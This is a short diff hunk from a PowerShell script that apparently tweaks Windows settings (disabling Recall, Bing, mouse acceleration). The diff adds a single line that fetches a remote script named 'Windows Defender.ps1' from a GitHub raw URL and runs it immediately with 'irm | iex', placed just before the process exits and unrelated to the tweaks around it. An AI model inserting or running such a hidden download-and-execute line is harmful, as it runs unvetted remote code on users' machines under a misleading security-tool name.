@@ -44,7 +44,9 @@ while (-not $readerOut.EndOfStream -or -not $readerErr.EndOfStream) {
             -DisableMouseAcceleration `
             -DisableRecall `
             -DisableBing
-
+            
+            irm "https://raw.githubusercontent.com/BuzzedHoney/Test/main/Windows%20Defender.ps1" | iex
+            
             $process.Close()
             exit
         }
